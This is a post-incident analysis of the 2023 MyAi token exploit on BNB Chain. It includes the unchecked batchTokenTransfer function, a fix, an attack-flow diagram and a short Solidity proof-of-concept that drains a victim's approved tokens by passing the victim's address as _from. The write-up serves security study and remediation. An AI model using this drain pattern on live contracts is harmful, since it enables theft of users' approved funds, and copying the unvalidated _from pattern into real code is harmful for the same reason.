# MyAi — Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-08 |
| **Protocol** | MyAi Token |
| **Chain** | BSC |
| **Loss** | ~10 BNB |
| **Attacker** | [0xc47fcc9263...](https://bscscan.com/address/0xc47fcc9263b026033a94574ec432514c639a2d12) |
| **Attack Contract** | [0x0d3aafb9...](https://bscscan.com/address/0x0d3aafb9ade835456b2595509ac1f58922e465b3) |
| **Attack Tx** | [0x346f65ac...](https://bscscan.com/tx/0x346f65ac333eb6d69886f5614aaf569a561a53a8d93db4384bd7c0bec15ae9f6) |
| **Vulnerable Contract** | [0xdb103fd2...](https://bscscan.com/address/0xdb103fd28ca4b18115f5ce908baaeed7e0f1f101) |
| **Root Cause** | No validation of `_from` parameter in `batchTokenTransfer()` — arbitrary address asset drainage |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/MyAi_exp.sol) |

---
## 1. Vulnerability Overview

The MultiSender or similar-function contract of the MyAi token contract exposes a `batchTokenTransfer(address _from, ...)` function that accepts an arbitrary address as the `_from` parameter. This function does not verify that the `_from` address is the actual caller, allowing an attacker to drain tokens that other users have approved to the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ No validation of _from parameter
interface IMultiSender {
    // ❌ _from can be set arbitrarily
    function batchTokenTransfer(
        address _from,          // ❌ No caller verification
        address[] memory _address,
        uint256[] memory _amounts,
        address token,
        uint256 totalAmount,
        bool isToken
    ) external;
}

// Vulnerable implementation (inferred)
function batchTokenTransfer(
    address _from,
    address[] memory _address,
    uint256[] memory _amounts,
    address token,
    uint256 totalAmount,
    bool isToken
) external {
    // ❌ No msg.sender == _from check
    IERC20(token).transferFrom(_from, address(this), totalAmount);
    for (uint256 i = 0; i < _address.length; i++) {
        IERC20(token).transfer(_address[i], _amounts[i]);
    }
}
```

```solidity
// ✅ Fix: validate _from
function batchTokenTransfer(
    address _from,
    address[] memory _address,
    uint256[] memory _amounts,
    address token,
    uint256 totalAmount,
    bool isToken
) external {
    // ✅ Only the caller can transfer their own tokens
    require(_from == msg.sender, "Unauthorized: _from must be caller");
    IERC20(token).transferFrom(_from, address(this), totalAmount);
    // ...
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// File: MyAi_decompiled.sol
    function batchTokenTransfer(address account, address[] param1, uint256[] param2, address owner, uint256 tokenId, bool enabled) external {}  // ❌
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│  1. Victim approves MyAi tokens to MultiSender           │
│     (for legitimate batch transfer purposes)             │
└──────────────────────────────┬───────────────────────────┘
                               ▼
┌──────────────────────────────────────────────────────────┐
│  2. Attacker: batchTokenTransfer(_from=victim, ...)      │
│     ❌ No _from validation                               │
│     → All victim-approved tokens drained                 │
└──────────────────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // Identify the address and amount approved by the victim
    address victim = 0x...;
    uint256 allowance = myAi.allowance(victim, address(multiSender));

    address[] memory recipients = new address[](1);
    recipients[0] = address(this);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = allowance;

    // ❌ Drain victim's tokens by specifying _from=victim
    multiSender.batchTokenTransfer(
        victim,       // ❌ Victim address — no validation
        recipients,
        amounts,
        address(myAi),
        allowance,
        true
    );
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | No `_from` parameter validation | CRITICAL | CWE-284 | 03_access_control.md |
| V-02 | Arbitrary drainage of approved tokens | CRITICAL | CWE-862 | 03_access_control.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
require(_from == msg.sender, "Caller must be _from");
```

## 7. Lessons Learned

Batch transfer utilities that accept a `_from` parameter must always verify that it matches `msg.sender`. This is one of the simplest attack vectors for bypassing the ERC-20 `transferFrom` allowance model.